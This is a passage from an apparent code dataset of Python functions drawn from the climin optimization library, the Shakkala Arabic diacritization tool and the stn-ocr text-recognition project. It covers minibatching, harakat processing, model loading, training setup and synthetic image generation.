    have a shape of ``(3, 2)`` and point to the elements ``flat[2:8]``.


    Parameters
    ----------

    spec : list of tuples of ints
        Specification of the desired shapes.

    empty_func : callable
        function that returns a memory region given an integer of the desired
        size. (Examples include ``numpy.empty``, which is the default,
        ``gnumpy.empty`` and ``theano.tensor.empty``.


    Returns
    -------

    flat : array_like (depending on ``empty_func``)
        Memory region containing all the views.

    views : list of array_like
        Variable number of results. Each contains a view into the array
        ``flat``.


    Examples
    --------

    >>> from climin.util import empty_with_views
    >>> flat, (w, b) = empty_with_views([(3, 2), 2])
    >>> w[...] = 1
    >>> b[...] = 2
    >>> flat
    array([ 1.,  1.,  1.,  1.,  1.,  1.,  2.,  2.])
    >>> flat[0] = 3
    >>> w
    array([[ 3.,  1.],
           [ 1.,  1.],
           [ 1.,  1.]])

    """"""
    shapes = [(i,) if isinstance(i, int) else i for i in shapes]
    sizes = [np.prod(i) for i in shapes]
    n_pars = sum(sizes)
    flat = empty_func(n_pars)
    views = shaped_from_flat(flat, shapes)
    return (flat, views)"
BRML/climin,arbitrary_slice,"def arbitrary_slice(arr, start, stop=None, axis=0):
    """"""Return a slice from `start` to `stop` in dimension `axis` of array `arr`.


    Parameters
    ----------

    arr : array_like
        Can be numpy ndarray, hdf5 dataset, or list.
        If ``arr`` is a list, ``axis`` must be 0.

    start : int
        Index at which to start slicing.

    stop : int, optional [default: None]
        Index at which to stop slicing.
        If not specified, the axis is sliced until its end.

    axis : int, optional [default: 0]
        Axis along which should be sliced


    Returns
    -------

    slice : array_like
        The respective slice of ``arr``
    """"""
    if type(arr) is list:
        if axis == 0:
            return arr[start:stop]
        else:
            raise ValueError('Cannot slice a list in non-zero axis {}'.format(axis))
    n_axes = len(arr.shape)
    if axis >= n_axes:
        raise IndexError('Argument `axis` with value {} out of range. Must be smaller than rank {} of `arr`.'.format(axis, n_axes))
    this_slice = [slice(None) for _ in range(n_axes)]
    this_slice[axis] = slice(start, stop)
    return arr[tuple(this_slice)]"
BRML/climin,minibatches,"def minibatches(arr, batch_size, d=0):
    """"""Return a list of views of the given arr.

    Each view represents a mini bach of the data.

    Parameters
    ----------

    arr : array_like
        Array to obtain batches from. Needs to be slicable. If ``d > 0``, needs
        to have a ``.shape`` attribute from which the number of samples can
        be obtained.

    batch_size : int
        Size of a batch. Last batch might be smaller if ``batch_size`` is not a
        divisor of ``arr``.

    d : int, optional, default: 0
        Dimension along which the data samples are separated and thus slicing
        should be done.

    Returns
    -------

    mini_batches : list
        Each item of the list is a view of ``arr``. Views are ordered.
    """"""
    if d == 0:
        (n_batches, rest) = divmod(len(arr), batch_size)
    else:
        (n_batches, rest) = divmod(arr.shape[d], batch_size)
    if rest:
        n_batches += 1
    slices = (slice(i * batch_size, (i + 1) * batch_size) for i in range(n_batches))
    if d == 0:
        res = [arr[i] for i in slices]
    elif d == 1:
        res = [arr[:, i] for i in slices]
    elif d == 2:
        res = [arr[:, :, i] for i in slices]
    return res"
BRML/climin,iter_minibatches,"def iter_minibatches(lst, batch_size, dims, n_cycles=None, random_state=None, discard_illsized_batch=False):
    """"""Return an iterator that successively yields tuples containing aligned
    minibatches of size `batch_size` from slicable objects given in `lst`, in
    random order without replacement.
    Because different containers might require slicing over different
    dimensions, the dimension of each container has to be givens as a list
    `dims`.


    Parameters
    ----------

    lst : list of array_like
        Each item of the list will be sliced into mini batches in alignment
        with the others.

    batch_size : int
        Size of each batch. Last batch might be smaller.

    dims : list
        Aligned with ``lst``, gives the dimension along which the data samples
        are separated.

    n_cycles : int, optional [default: None]
        Number of cycles after which to stop the iterator. If ``None``, will
        yield forever.

    random_state : a numpy.random.RandomState object, optional [default : None]
        Random number generator that will act as a seed for the minibatch order.

    discard_illsized_batch : bool, optional [default : False]
        If ``True`` and the length of the sliced dimension is not divisible by
        ``batch_size``, the leftover samples are discarded.


    Returns
    -------
    batches : iterator
        Infinite iterator of mini batches in random order (without replacement).
    """"""
    if type(n_cycles) == bool and (not n_cycles):
        n_cycles = None
        warnings.warn('n_cycles=False kwarg to iter_minibatches deprecated. Using n_cycles=None instead.')
    try:
        dm_result = [divmod(len(arr), batch_size) if d == 0 else divmod(arr.shape[d], batch_size) for (arr, d) in zip(lst, dims)]
    except AttributeError:
        raise AttributeError(""'list' object has no attribute 'shape'. Trying to slice a list in a non-zero axis."")
    except IndexError:
        raise IndexError('tuple index out of range. Trying to slice along a non-existing dimension.')
    if dm_result.count(dm_result[0]) == len(dm_result):
        (n_batches, rest) = dm_result[0]
        if rest and (not discard_illsized_batch):
            n_batches += 1
    else:
        raise ValueError('The axes along which to slice have unequal lengths.')
    if random_state is not None:
        random.seed(random_state.normal())
    counter = itertools.count()
    count = next(counter)
    while True:
        indices = range(n_batches)
        while True:
            if n_cycles is not None and count >= n_cycles:
                raise StopIteration()
            count = next(counter)
            random.shuffle(indices)
            for i in indices:
                start = i * batch_size
                stop = (i + 1) * batch_size
                batch = [arbitrary_slice(arr, start, stop, axis) for (arr, axis) in zip(lst, dims)]
                yield tuple(batch)"
BRML/climin,started,"def started(*args, **kwargs):
    cr = f(*args, **kwargs)
    next(cr)
    return cr"
BRML/climin,__init__,"def __init__(self, **options):
    """"""Create an OptimizerDistribution object.

        Parameters
        ----------

        options : dict
            Maps an optimizer key to a grid to sample from.
        """"""
    self.options = options"
BRML/climin,rvs,"def rvs(self):
    opt = random.choice(list(self.options.keys()))
    grid = self.options[opt]
    sample = list(ParameterSampler(grid, n_iter=1))[0]
    return (opt, sample)"
Barqawiz/Shakkala,__init__,"def __init__(self, folder_location=None, version=3):
    if folder_location is None:
        folder_location = os.path.dirname(os.path.abspath(__file__))
    assert folder_location != None, 'model_location cant be empty, send location of keras model'
    model_folder = os.path.join(folder_location, 'model')
    if version == 1:
        self.max_sentence = 495
        self.model_location = os.path.join(model_folder, 'simple_model' + '.h5')
    elif version == 2:
        self.max_sentence = 315
        self.model_location = os.path.join(model_folder, 'middle_model' + '.h5')
    elif version == 3:
        self.max_sentence = 315
        self.model_location = os.path.join(model_folder, 'second_model6' + '.h5')
    dictionary_folder = os.path.join(folder_location, 'dictionary')
    input_vocab_to_int = helper.load_binary('input_vocab_to_int', dictionary_folder)
    output_int_to_vocab = helper.load_binary('output_int_to_vocab', dictionary_folder)
    self.dictionary = {'input_vocab_to_int': input_vocab_to_int, 'output_int_to_vocab': output_int_to_vocab}"
Barqawiz/Shakkala,get_model,"def get_model(self):
    print('start load model')
    model = load_model(self.model_location)
    print('end load model')
    graph = tf.compat.v1.get_default_graph()
    return (model, graph)"
Barqawiz/Shakkala,prepare_input,"def prepare_input(self, input_sent):
    assert input_sent != None and len(input_sent) < self.max_sentence, 'max length for input_sent should be {} characters, you can split the sentence into multiple sentecens and call the function'.format(self.max_sentence)
    input_sent = [input_sent]
    return self.__preprocess(input_sent)"
Barqawiz/Shakkala,__preprocess,"def __preprocess(self, input_sent):
    input_vocab_to_int = self.dictionary['input_vocab_to_int']
    input_letters_ids = [[input_vocab_to_int.get(ch, input_vocab_to_int['<UNK>']) for ch in sent] for sent in input_sent]
    input_letters_ids = self.__pad_size(input_letters_ids, self.max_sentence)
    return input_letters_ids"
Barqawiz/Shakkala,logits_to_text,"def logits_to_text(self, logits):
    text = []
    for prediction in np.argmax(logits, 1):
        if self.dictionary['output_int_to_vocab'][prediction] == '<PAD>':
            continue
        text.append(self.dictionary['output_int_to_vocab'][prediction])
    return text"
Barqawiz/Shakkala,get_final_text,"def get_final_text(self, input_sent, output_sent):
    return helper.combine_text_with_harakat(input_sent, output_sent)"
Barqawiz/Shakkala,clean_harakat,"def clean_harakat(self, input_sent):
    return helper.clear_tashkel(input_sent)"
Barqawiz/Shakkala,__pad_size,"def __pad_size(self, x, length=None):
    return pad_sequences(x, maxlen=length, padding='post')"
Barqawiz/Shakkala,save_binary,"def save_binary(data, file, folder):
    location = os.path.join(folder, file + '.pickle')
    with open(location, 'wb') as ff:
        pickle.dump(data, ff, protocol=pickle.HIGHEST_PROTOCOL)"
Barqawiz/Shakkala,load_binary,"def load_binary(file, folder):
    location = os.path.join(folder, file + '.pickle')
    with open(location, 'rb') as ff:
        data = pickle.load(ff)
    return data"
Barqawiz/Shakkala,get_sentences,"def get_sentences(data):
    return [sent for line in re.split('[\n,،]+', data) if line for sent in sent_tokenize(line.strip()) if sent]"
Barqawiz/Shakkala,clear_punctuations,"def clear_punctuations(text):
    text = ''.join((c for c in text if c not in string.punctuation))
    return text"
Barqawiz/Shakkala,clear_english_and_numbers,"def clear_english_and_numbers(text):
    text = re.sub('[a-zA-Z0-9٠-٩]', ' ', text)
    return text"
Barqawiz/Shakkala,is_tashkel,"def is_tashkel(text):
    return any((ord(ch) in harakat for ch in text))"
Barqawiz/Shakkala,clear_tashkel,"def clear_tashkel(text):
    text = ''.join((c for c in text if ord(c) not in harakat))
    return text"
Barqawiz/Shakkala,get_harakat,"def get_harakat():
    return ''.join((chr(item) + '|' for item in harakat))[:-1]"
Barqawiz/Shakkala,get_taskel,"def get_taskel(sentence):
    output = []
    current_haraka = ''
    for ch in reversed(sentence):
        if ord(ch) in harakat:
            if current_haraka == '' or (ord(ch) == connector and chr(connector) not in current_haraka) or chr(connector) == current_haraka:
                current_haraka += ch
        else:
            if current_haraka == '':
                current_haraka = 'ـ'
            output.insert(0, current_haraka)
            current_haraka = ''
    return output"
Barqawiz/Shakkala,combine_text_with_harakat,"def combine_text_with_harakat(input_sent, output_sent):
    """"""
    harakat_stack = Stack()
    temp_stack    = Stack()
    #process harakat
    for character, haraka in zip(input_sent, output_sent):
        temp_stack = Stack()

        haraka = haraka.replace(""<UNK>"","""").replace(""<PAD>"","""").replace(""ـ"","""")

        if (character == "" "" and haraka != """" and ord(haraka) == connector):
            combine = harakat_stack.pop()
            combine += haraka
            harakat_stack.push(combine)
        else:
            harakat_stack.push(haraka)
    """"""
    input_length = len(input_sent)
    output_length = len(output_sent)
    for index in range(0, input_length - output_length):
        output_sent.append('')
    text = ''
    for (character, haraka) in zip(input_sent, output_sent):
        if haraka == '<UNK>' or haraka == 'ـ':
            haraka = ''
        text += character + '' + haraka
    return text"
Barqawiz/Shakkala,__init__,"def __init__(self):
    self.stack = []"
Barqawiz/Shakkala,isEmpty,"def isEmpty(self):
    return self.size() == 0"
Barqawiz/Shakkala,push,"def push(self, item):
    self.stack.append(item)"
Barqawiz/Shakkala,pop,"def pop(self):
    return self.stack.pop()"
Barqawiz/Shakkala,peek,"def peek(self):
    if self.size() == 0:
        return None
    else:
        return self.stack[len(self.stack) - 1]"
Barqawiz/Shakkala,size,"def size(self):
    return len(self.stack)"
Barqawiz/Shakkala,to_array,"def to_array(self):
    return self.stack"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = FSNSNetwork.get_network(data_shape, output_size, 3, 1, 10, blstm=True)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 30)), ('l0_forward_init_h_state', (1, 4, 256)), ('l0_forward_init_c_state_cell', (1, 4, 256)), ('l0_backward_init_h_state', (1, 4, 256)), ('l0_backward_init_c_state_cell', (1, 4, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_backward_init_h_state'] = mx.nd.zeros((1, 4, 256))
    arg_params['l0_backward_init_c_state_cell'] = mx.nd.zeros((1, 4, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, '')"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = SVHNMultiLineCTCNetwork.get_network(data_shape, output_size, 11, 2, 3)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 3)), ('l0_forward_init_h_state', (1, 1, 256)), ('l0_forward_init_c_state_cell', (1, 1, 256)), ('l1_forward_init_h_state', (1, 1, 256)), ('l1_forward_init_c_state_cell', (1, 1, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    labels = strip_prediction(np.argmax(outputs[2].asnumpy(), axis=1), args.blank_label)
    labels = ''.join([chr(char_map[str(x)]) for x in labels])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, labels)"
Bartzi/stn-ocr,get_model,"def get_model(args, data_shape, output_size):
    (symbol, arg_params, aux_params) = mx.model.load_checkpoint(args.model_prefix, args.model_epoch)
    (net, loc, transformed_output, size_params) = SVHNMultiLineCTCNetwork.get_network(data_shape, output_size, 46, 2, 23)
    output = mx.symbol.Group([loc, transformed_output, net])
    context = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    model = mx.mod.Module(output, context=context)
    model.bind(data_shapes=[('data', data_shape), ('softmax_label', (1, 23)), ('l0_forward_init_h_state', (1, 1, 256)), ('l0_forward_init_c_state_cell', (1, 1, 256)), ('l1_forward_init_h_state', (1, 1, 256)), ('l1_forward_init_c_state_cell', (1, 1, 256))], for_training=False, grad_req='null')
    arg_params['l0_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l0_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_h_state'] = mx.nd.zeros((1, 1, 256))
    arg_params['l1_forward_init_c_state_cell'] = mx.nd.zeros((1, 1, 256))
    model.set_params(arg_params, aux_params)
    return model"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(bbox_plotter, model, input_image, iteration):
    outputs = model.get_outputs()
    (transform_params, interpolated_areas) = bbox_plotter.get_area_data(1, outputs[0], outputs[1])
    bbox_plotter.save_extracted_regions(input_image, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, '')"
Bartzi/stn-ocr,parse_args,"def parse_args():
    parser = argparse.ArgumentParser(description='train an image classifer on mnist')
    parser.add_argument('train_file', type=str, help='the csv file containing all training data')
    parser.add_argument('val_file', type=str, help='the csv file containing all validation data')
    parser.add_argument('--gpus', type=str, help='the gpus will be used, e.g ""0,1,2,3""')
    parser.add_argument('--batch-size', '-b', type=int, default=128, help='the batch size')
    parser.add_argument('--lr', type=float, default=0.001, help='the initial learning rate')
    parser.add_argument('--model-prefix', type=str, help='the prefix of the model to load/save')
    parser.add_argument('--save-model-prefix', type=str, help='the prefix of the model to save')
    parser.add_argument('--num-epochs', type=int, default=10, help='the number of training epochs')
    parser.add_argument('--load-epoch', type=int, help='load the model on an epoch using the model-prefix')
    parser.add_argument('--kv-store', type=str, default='local', help='the kvstore type')
    parser.add_argument('--lr-factor', type=float, default=1, help='times the lr with a factor for every lr-factor-epoch epoch')
    parser.add_argument('--lr-factor-epoch', type=float, default=1, help='the number of epoch to factor the lr, could be .5')
    parser.add_argument('--plot', action='store_true', default=False, dest='plot_network_graph', help='plot the computational graph of the network to a file')
    parser.add_argument('--log-dir', '-l', default='logs', help='path to base log directory [default: logs]')
    parser.add_argument('--log-name', '-ln', default='training', help='name of the directory where logs and plots shall be put in [default: training]')
    parser.add_argument('--log-level', default='INFO', help='sets the log level [default: INFO]')
    parser.add_argument('--send-bboxes', default=False, action='store_true', help='send bbox images for each time step to upstream viewer (you must provide an upstream if you are using this feature)')
    parser.add_argument('--ip', help='upstream ip that can recieve bboxes')
    parser.add_argument('--port', default=1337, type=int, help='remote port to connect to')
    parser.add_argument('--gif', action='store_true', default=False, help='create a gif of plotted bboxes')
    parser.add_argument('--video', action='store_true', default=False, help='create a video of plotted bboxes')
    parser.add_argument('--fix-loc', action='store_true', default=False, help='fix the params of the localisation network')
    parser.add_argument('--progressbar', action='store_true', default=False, help='show a progressbar')
    parser.add_argument('--char-map', help='path to char map in json format, used to display current prediction')
    parser.add_argument('--blank-label', type=int, default=0, help='label that indicates the blank case [default: 0]')
    parser.add_argument('-ci', '--checkpoint_interval', type=int, help='number of iterations after which a checkpoint shall be saved')
    parser.add_argument('--zoom', type=float, default=0.9, help='default zoom value for initialisation of STN param predictor')
    parser.add_argument('--eval-image', help='path to image that shall be used by bbox plotter [default: take random image from val dataset]')
    return parser"
Bartzi/stn-ocr,init_logging,"def init_logging(args, kv, epoch_size):
    head = '%(asctime)-15s Node[' + str(kv.rank) + '] %(message)s'
    if not os.path.exists(args.log_dir):
        os.mkdir(args.log_dir)
    logger = logging.getLogger()
    handler = logging.FileHandler(args.log_file)
    formatter = logging.Formatter(head)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    logger.setLevel(args.log_level.upper())
    logger.info('start with arguments %s', args)
    logger.info('EPOCH SIZE: %s', int(epoch_size))"
Bartzi/stn-ocr,fit,"def fit(args, network, train_data, epoch_size, initializer, eval_metric, batch_end_callback=None):
    kv = mx.kvstore.create(args.kv_store)
    init_logging(args, kv, epoch_size)
    model_prefix = args.model_prefix
    model_args = {}
    if args.load_epoch is not None:
        assert model_prefix is not None
        tmp = mx.model.FeedForward.load(model_prefix, args.load_epoch)
        model_args = {'arg_params': tmp.arg_params, 'aux_params': tmp.aux_params, 'begin_epoch': args.load_epoch}
        model_args['begin_num_update'] = epoch_size * args.load_epoch
    save_model_prefix = args.save_model_prefix
    if save_model_prefix is None:
        save_model_prefix = model_prefix
    if save_model_prefix is not None:
        save_model_prefix = os.path.join(args.log_dir, 'models', save_model_prefix)
        os.makedirs(os.path.dirname(save_model_prefix), exist_ok=True)
    checkpoint = None if save_model_prefix is None else mx.callback.do_checkpoint(save_model_prefix)
    (train, val) = train_data
    devs = mx.cpu() if args.gpus is None else [mx.gpu(int(i)) for i in args.gpus.split(',')]
    lr_scheduler = None
    if 'lr_factor' in args and args.lr_factor < 1:
        lr_scheduler = mx.lr_scheduler.FactorScheduler(step=max(int(epoch_size * args.lr_factor_epoch), 1), factor=args.lr_factor)
    if 'clip_gradient' in args and args.clip_gradient is not None:
        model_args['clip_gradient'] = args.clip_gradient
    if 'local' in kv.type and (args.gpus is None or len(args.gpus.split(',')) is 1):
        kv = None
    model = mx.model.FeedForward(ctx=devs, symbol=network, num_epoch=args.num_epochs, epoch_size=epoch_size, learning_rate=args.lr, optimizer=mx.optimizer.SGD(momentum=0.9, learning_rate=args.lr, lr_scheduler=lr_scheduler), momentum=0.9, wd=1e-05, initializer=initializer, **model_args)
    if batch_end_callback is not None:
        if not isinstance(batch_end_callback, list):
            batch_end_callback = [batch_end_callback]
    else:
        batch_end_callback = []
    batch_end_callback.append(mx.callback.Speedometer(args.batch_size, 50))
    if args.checkpoint_interval is not None:
        batch_end_callback.append(get_create_checkpoint_callback(args.checkpoint_interval, save_model_prefix))
    if args.progressbar:
        batch_end_callback.append(mx.callback.ProgressBar(epoch_size))
    model.fit(X=train, eval_data=val, eval_metric=eval_metric, kvstore=kv, batch_end_callback=batch_end_callback, epoch_end_callback=checkpoint)"
Bartzi/stn-ocr,get_image_paths,"def get_image_paths(dir):
    all_images = []
    for (root, _, files) in os.walk(dir):
        files = [os.path.join(root, f) for f in filter(lambda x: os.path.splitext(x)[-1].lower() in SUPPORTED_IMAGES, files)]
        all_images.extend(files)
    return all_images"
Bartzi/stn-ocr,get_image,"@lru_cache(maxsize=1024)
def get_image(image_path):
    return Image.open(image_path)"
Bartzi/stn-ocr,find_font_size,"@lru_cache(maxsize=1024)
def find_font_size(draw, text_lines, max_width, max_height, spacing):
    font_size = 35
    while True:
        font = ImageFont.truetype(random.choice(FONTS), size=font_size, encoding='unic')
        (text_width, text_height) = draw.multiline_textsize(text_lines, font, spacing=spacing)
        if text_width <= max_width and text_height <= max_height:
            return (font, (text_width, text_height))
        font_size -= 1
        if font_size <= 1:
            raise ValueError('Can not draw Text on given image')"
Bartzi/stn-ocr,random_crop,"def random_crop(image, crop_width, crop_height):
    left = min(random.choice(range(image.width)), image.width - crop_width)
    top = min(random.choice(range(image.height)), image.height - crop_height)
    return image.crop((left, top, left + crop_width, top + crop_height))"
Bartzi/stn-ocr,save_image,"def save_image(index, image, base_dest_dir, split_ratio):

    def get_subdir():
        return os.path.join('{:04d}'.format(index // (MAX_IMAGES_PER_DIR * MAX_IMAGES_PER_DIR)), '{:04d}'.format(index // MAX_IMAGES_PER_DIR))
    split_dir = 'validation' if random.randint(1, 100) < split_ratio else 'train'
    dest_dir = os.path.join(base_dest_dir, split_dir, get_subdir())
    os.makedirs(dest_dir, exist_ok=True)
    image_path = '{}.png'.format(os.path.join(dest_dir, str(index)))
    image.save(image_path)
    return (image_path, split_dir == 'train')"
Bartzi/stn-ocr,get_labels,"def get_labels(words, char_map, blank_label, max_length, max_textlines):
    all_labels = []
    for word in words:
        labels = [char_map[ord(char)] for char in word]
        labels.extend([blank_label] * (max_length - len(labels)))
        all_labels.append(labels)
    if len(all_labels) < max_textlines:
        all_labels.extend([[blank_label] * max_length for _ in range(max_textlines - len(all_labels))])
    return [label for labels in all_labels for label in labels]"
Bartzi/stn-ocr,get_subdir,"def get_subdir():
    return os.path.join('{:04d}'.format(index // (MAX_IMAGES_PER_DIR * MAX_IMAGES_PER_DIR)), '{:04d}'.format(index // MAX_IMAGES_PER_DIR))"
Bartzi/stn-ocr,find_way_to_common_dir,"def find_way_to_common_dir(common_dir, dir):
    dirs = []
    base_dir = dir
    while True:
        (base_dir, dirname) = os.path.split(base_dir)
        dirs.append(dirname)
        if base_dir in common_dir:
            break
    return reversed(dirs)"
Bartzi/stn-ocr,intersects_bbox,"def intersects_bbox(point, bbox):
    if bbox.left <= point.x <= bbox.left + bbox.width:
        return True
    elif bbox.top <= point.y <= bbox.top + bbox.height:
        return True
    return False"
Bartzi/stn-ocr,overlap,"def overlap(x1, w1, x2, w2):
    l1 = x1 - w1 / 2
    l2 = x2 - w2 / 2
    left = l1 if l1 > l2 else l2
    r1 = x1 + w1 / 2
    r2 = x2 + w2 / 2
    right = r1 if r1 < r2 else r2
    return right - left"
Bartzi/stn-ocr,intersection,"def intersection(bbox1, bbox2):
    width_overlap = overlap(bbox1.left, bbox1.width, bbox2.left, bbox2.width)
    height_overlap = overlap(bbox1.top, bbox1.height, bbox2.top, bbox2.height)
    if width_overlap < 0 or height_overlap < 0:
        return 0
    return width_overlap * height_overlap"
Bartzi/stn-ocr,intersects,"def intersects(bbox1, bbox2):
    return intersection(bbox1, bbox2) > 0"
Bartzi/stn-ocr,is_close,"def is_close(questioned, other, epsilon=50):
    return all((b - epsilon <= a <= b + epsilon for (a, b) in zip(questioned, other)))"
Bartzi/stn-ocr,__init__,"def __init__(self, label=0, left=0, width=0, top=0, height=0):
    self.label = [label] if not hasattr(label, '__iter__') else label
    self._left = left
    self._width = width
    self._top = top
    self._height = height"
Bartzi/stn-ocr,left,"@property
def left(self):
    return int(self._left)"
Bartzi/stn-ocr,left,"@left.setter
def left(self, value):
    self._left = int(value)"
Bartzi/stn-ocr,width,"@property
def width(self):
    return int(self._width)"
Bartzi/stn-ocr,width,"@width.setter
def width(self, value):
    self._width = int(value)"
Bartzi/stn-ocr,top,"@property
def top(self):
    return int(self._top)"
Bartzi/stn-ocr,top,"@top.setter
def top(self, value):
    self._top = int(value)"
Bartzi/stn-ocr,height,"@property
def height(self):
    return int(self._height)"
Bartzi/stn-ocr,height,"@height.setter
def height(self, value):
    self._height = int(value)"
Bartzi/stn-ocr,__eq__,"def __eq__(self, other):
    return self.left == other.left and self.width == other.width and (self.top == other.top) and (self.height == other.height)"
Bartzi/stn-ocr,__str__,"def __str__(self):
    return 'l:{}, w:{}, t:{}, h:{}'.format(self.left, self.width, self.top, self.height)"
Bartzi/stn-ocr,__init__,"def __init__(self, image_dir, gt, image_size, numbers_per_image):
    self.image_dir = image_dir
    self.gt = gt
    self.image_size = image_size
    self.numbers_per_image = numbers_per_image
    self.max_size_per_number = 0.3"
Bartzi/stn-ocr,merge_bboxes,"@staticmethod
def merge_bboxes(bboxes):
    resulting_bbox = None
    for bbox in bboxes:
        if resulting_bbox is None:
            resulting_bbox = bbox
            continue
        max_right = max(resulting_bbox.left + resulting_bbox.width, bbox.left + bbox.width)
        max_bottom = max(resulting_bbox.top + resulting_bbox.height, bbox.top + bbox.height)
        resulting_bbox.top = min(resulting_bbox.top, bbox.top)
        resulting_bbox.left = min(resulting_bbox.left, bbox.left)
        resulting_bbox.width = max_right - resulting_bbox.left
        resulting_bbox.height = max_bottom - resulting_bbox.top
        resulting_bbox.label.extend(bbox.label)
    return resulting_bbox"
Bartzi/stn-ocr,create_base_image,"def create_base_image(self, colour):
    background = Image.new('RGBA', (self.image_size, self.image_size), colour + (255,))
    return background"
Bartzi/stn-ocr,fade_image,"def fade_image(self, image, fade_percentage=0.4):

    def interpolate_width(data):
        num_interpolation_pixels = int(data.shape[1] * fade_percentage)
        interpolation_start = data.shape[1] - num_interpolation_pixels
        for i in range(num_interpolation_pixels):
            data[:, interpolation_start + i, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
        return data

    def interpolate_height(data):
        num_interpolation_pixels = int(data.shape[0] * fade_percentage)
        interpolation_start = data.shape[0] - num_interpolation_pixels
        for i in range(num_interpolation_pixels):
            data[interpolation_start + i, :, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
        return data
    image_data = np.asarray(image).copy().astype(np.float64)
    image_data = interpolate_width(image_data)
    image_data = np.fliplr(image_data)
    image_data = interpolate_width(image_data)
    image_data = np.fliplr(image_data)
    image_data = interpolate_height(image_data)
    image_data = np.flipud(image_data)
    image_data = interpolate_height(image_data)
    image_data = np.flipud(image_data)
    image = Image.fromarray(image_data.astype(np.uint8), mode='RGBA')
    return image"
Bartzi/stn-ocr,crop_number,"def crop_number(self, image, bbox, enlarge_percentage=0.5):
    (width, height) = image.size
    width_enlargement = width * enlarge_percentage
    height_enlargement = height * enlarge_percentage
    larger_bbox = BBox(label=bbox.label, top=max(bbox.top - height_enlargement // 2, 0), left=max(bbox.left - width_enlargement // 2, 0), width=bbox.width + width_enlargement, height=bbox.height + height_enlargement)
    cropped_number = image.crop((larger_bbox.left, larger_bbox.top, larger_bbox.left + larger_bbox.width, larger_bbox.top + larger_bbox.height))
    cropped_number = self.fade_image(cropped_number)
    return (cropped_number, larger_bbox)"
Bartzi/stn-ocr,find_paste_location,"def find_paste_location(self, bbox, already_pasted_bboxes):
    original_bbox = copy.copy(bbox)
    while True:
        bbox = original_bbox
        top_left = Point._make((random.randint(0, self.image_size) for _ in range(2)))
        bbox.left = min(top_left.x, self.image_size - bbox.width)
        bbox.top = min(top_left.y, self.image_size - bbox.height)
        if all([intersection(bbox, b) == 0 for b in already_pasted_bboxes]):
            return bbox"
Bartzi/stn-ocr,adjust_house_number_crop,"def adjust_house_number_crop(self, crop, bbox):
    max_size = int(self.image_size * self.max_size_per_number)
    if crop.width <= max_size and crop.height <= max_size:
        return (crop, bbox)
    (new_height, new_width) = (max_size, max_size)
    if crop.width < max_size:
        new_width = crop.width
    if crop.height < max_size:
        new_height = crop.height
    crop = crop.resize((new_width, new_height), Image.LANCZOS)
    bbox.width = new_width
    bbox.height = new_height
    return (crop, bbox)"
Bartzi/stn-ocr,get_dominating_color,"def get_dominating_color(self, image):
    image_data = np.asarray(image)
    image_data = np.reshape(image_data, (-1, 4))[:, :-1]
    channel_means = np.mean(image_data, axis=0)
    return [int(mean) for mean in channel_means]"
Bartzi/stn-ocr,get_number_crop,"def get_number_crop(self):
    svhn_image = random.choice(self.gt)
    bboxes = [BBox(label=int(b['label']), left=b['left'], width=b['width'], top=b['top'], height=b['height']) for b in svhn_image['boxes']]
    merged_bbox = self.merge_bboxes(bboxes)
    with Image.open(os.path.join(self.image_dir, svhn_image['filename'])) as image:
        image = image.convert('RGBA')
        (house_number_crop, merged_bbox) = self.crop_number(image, merged_bbox)
    dominating_color = self.get_dominating_color(house_number_crop)
    return (house_number_crop, merged_bbox, dominating_color)"
Bartzi/stn-ocr,sort_bboxes,"def sort_bboxes(self, bboxes):
    bboxes = sorted(bboxes, key=lambda x: x.left)
    bboxes = sorted(bboxes, key=lambda x: x.top)
    return bboxes"
Bartzi/stn-ocr,create_sample,"def create_sample(self):
    found_bboxes = []
    images = []
    dominating_colour = None
    for _ in range(self.numbers_per_image):
        (house_number_crop, bbox, median_colour) = self.get_number_crop()
        if len(images) > 0:
            while True:
                if is_close(median_colour, dominating_colour):
                    break
